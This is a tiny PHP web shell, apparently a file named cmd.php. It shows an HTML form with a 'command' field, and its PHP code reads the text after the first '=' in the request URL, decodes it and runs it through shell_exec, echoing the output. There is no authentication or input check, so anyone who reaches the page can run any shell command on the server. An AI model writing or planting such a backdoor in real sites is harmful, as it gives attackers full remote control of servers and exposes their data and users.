<form action="/cmd.php">
  <input type="text" placeholder="command" name=" ">
  <button type="submit">submit</button>
</form>
<pre>
<?php
  $cmd = substr($_SERVER['REQUEST_URI'], strpos($_SERVER['REQUEST_URI'], "=", 1)+1);
  $cmd = urldecode($cmd);
  $cmd = $cmd === "" ? "echo hello" : $cmd;
  echo shell_exec($cmd." 2>&1");
?>
</pre>
<br>
